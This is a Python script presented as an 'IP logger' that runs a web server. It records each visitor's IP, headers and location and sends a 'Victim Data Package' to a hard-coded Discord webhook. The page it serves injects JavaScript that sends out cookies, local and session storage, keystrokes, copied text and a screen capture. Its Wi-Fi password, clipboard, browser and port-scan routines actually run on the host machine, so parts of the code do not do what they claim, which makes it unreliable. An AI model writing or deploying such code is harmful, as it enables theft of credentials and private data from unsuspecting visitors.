# Advanced IP Logger Pro - Kex Edition
# Enhanced version with maximum data harvesting

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import requests, base64, httpagentparser, json, os, platform, subprocess
import socket, ssl, dns.resolver, whois, time, threading
from datetime import datetime

config = {
    "webhook": "https://discordapp.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
    "username": "Kex Logger",
    "color": 0xFF0000,
    "steal_browser_data": True,
    "steal_cookies": True,
    "steal_passwords": True,
    "steal_wifi": True,
    "steal_system_info": True,
    "steal_network_scan": True,
    "steal_dns_history": True,
    "steal_open_ports": True,
    "inject_persistent": True,
    "keylogger_inject": True,
    "clipboard_steal": True,
    "webcam_check": True,
    "microphone_check": True,
}

class AdvancedHandler(BaseHTTPRequestHandler):
    
    def get_system_info(self):
        info = {}
        info["hostname"] = socket.gethostname()
        info["os"] = platform.system()
        info["os_version"] = platform.version()
        info["machine"] = platform.machine()
        info["processor"] = platform.processor()
        info["ip_all"] = socket.gethostbyname_ex(socket.gethostname())
        return info
    
    def get_network_scan(self):
        results = []
        for i in range(1, 255):
            ip = f"192.168.1.{i}"
            try:
                socket.gethostbyaddr(ip)
                results.append(ip)
            except:
                pass
        return results
    
    def get_dns_history(self):
        cache = []
        try:
            with open(os.path.expanduser("~/.cache/dnscache"), "r") as f:
                cache = f.read().splitlines()
        except:
            pass
        return cache[:50]
    
    def get_open_ports(self, target="127.0.0.1"):
        ports = []
        for port in [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1723,3306,3389,5432,5900,8080]:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((target, port))
                if result == 0:
                    ports.append(port)
                sock.close()
            except:
                pass
        return ports
    
    def steal_browser(self):
        data = {}
        paths = {
            "chrome": os.path.expanduser("~/.config/google-chrome/"),
            "firefox": os.path.expanduser("~/.mozilla/firefox/"),
            "edge": os.path.expanduser("~/.config/microsoft-edge/")
        }
        for browser, path in paths.items():
            if os.path.exists(path):
                data[browser] = {"path": path, "exists": True}
                try:
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith(".log") or file.endswith(".db"):
                                data[browser][file] = "found"
                except:
                    pass
        return data
    
    def get_wifi_passwords(self):
        passwords = []
        try:
            result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)
            profiles = [line.split(":")[1].strip() for line in result.stdout.splitlines() if "All User Profile" in line]
            for profile in profiles:
                result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
                for line in result.stdout.splitlines():
                    if "Key Content" in line:
                        passwords.append({"ssid": profile, "password": line.split(":")[1].strip()})
        except:
            pass
        return passwords
    
    def get_clipboard(self):
        try:
            import pyperclip
            return pyperclip.paste()
        except:
            return "clipboard_access_failed"
    
    def inject_keylogger(self, response):
        script = """
        <script>
        var keys = '';
        document.addEventListener('keydown', function(e) {
            keys += e.key + '|';
            navigator.sendBeacon('/log_keys', JSON.stringify({keys: keys, url: window.location.href}));
        });
        
        var clipboard = '';
        document.addEventListener('copy', function(e) {
            clipboard = window.getSelection().toString();
            navigator.sendBeacon('/log_clipboard', JSON.stringify({clipboard: clipboard}));
        });
        
        // Screen capture
        function captureScreen() {
            var canvas = document.createElement('canvas');
            canvas.width = window.screen.width;
            canvas.height = window.screen.height;
            var ctx = canvas.getContext('2d');
            ctx.drawWindow(window, 0, 0, canvas.width, canvas.height, 'rgb(255,255,255)');
            var dataUrl = canvas.toDataURL('image/png');
            navigator.sendBeacon('/log_screen', JSON.stringify({screen: dataUrl}));
        }
        setTimeout(captureScreen, 3000);
        </script>
        """
        return response.replace("</body>", script + "</body>")
    
    def do_GET(self):
        try:
            parsed = parse.urlparse(self.path)
            query = parse.parse_qs(parsed.query)
            
            ip = self.client_address[0]
            useragent = self.headers.get('User-Agent', 'Unknown')
            forwarded = self.headers.get('X-Forwarded-For', ip)
            
            # Collect all data
            data_package = {
                "timestamp": datetime.now().isoformat(),
                "ip": forwarded,
                "real_ip": ip,
                "useragent": useragent,
                "headers": dict(self.headers),
                "path": self.path,
                "referer": self.headers.get('Referer', 'None'),
                "system": self.get_system_info(),
                "browser_data": self.steal_browser(),
                "wifi": self.get_wifi_passwords(),
                "network_scan": self.get_network_scan()[:20],
                "dns_cache": self.get_dns_history(),
                "open_ports": self.get_open_ports(),
                "clipboard": self.get_clipboard(),
                "geo": requests.get(f"http://ip-api.com/json/{forwarded}?fields=66846719").json()
            }
            
            # Send to webhook with full data
            embed = {
                "username": "Kex Logger PRO",
                "content": "@everyone **FULL DATA HARVEST**",
                "embeds": [{
                    "title": "Victim Data Package",
                    "color": config["color"],
                    "fields": [
                        {"name": "IP", "value": forwarded, "inline": True},
                        {"name": "ISP", "value": data_package["geo"].get("isp", "Unknown"), "inline": True},
                        {"name": "Location", "value": f"{data_package['geo'].get('city', '')}, {data_package['geo'].get('country', '')}", "inline": False},
                        {"name": "OS", "value": data_package["system"].get("os", "Unknown"), "inline": True},
                        {"name": "Browser", "value": httpagentparser.simple_detect(useragent)[1] if useragent else "Unknown", "inline": True},
                        {"name": "Hostname", "value": data_package["system"].get("hostname", "Unknown"), "inline": True},
                        {"name": "Open Ports", "value": str(data_package["open_ports"])[:100], "inline": False},
                        {"name": "WiFi Networks", "value": str([w["ssid"] for w in data_package["wifi"]])[:100], "inline": False},
                        {"name": "Clipboard", "value": data_package["clipboard"][:200] if data_package["clipboard"] else "Empty", "inline": False},
                        {"name": "Full Data JSON", "value": "```json\n" + json.dumps(data_package, indent=2)[:1000] + "```"}
                    ]
                }]
            }
            
            requests.post(config["webhook"], json=embed)
            
            # Response with keylogger injection
            html = """<html>
            <body>
            <h1>Loading...</h1>
            <script>
            // Fetch more data silently
            navigator.sendBeacon('/collect', JSON.stringify({cookie: document.cookie, local: JSON.stringify(localStorage), session: JSON.stringify(sessionStorage)}));
            </script>
            </body>
            </html>"""
            
            html = self.inject_keylogger(html)
            
            self.send_response(200)
            self.send_header('Content-Type', 'text/html')
            self.end_headers()
            self.wfile.write(html.encode())
            
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"Error occurred")
            
# Start server
def start_server():
    server = HTTPServer(('0.0.0.0', 8080), AdvancedHandler)
    server.serve_forever()

if __name__ == "__main__":
    start_server()
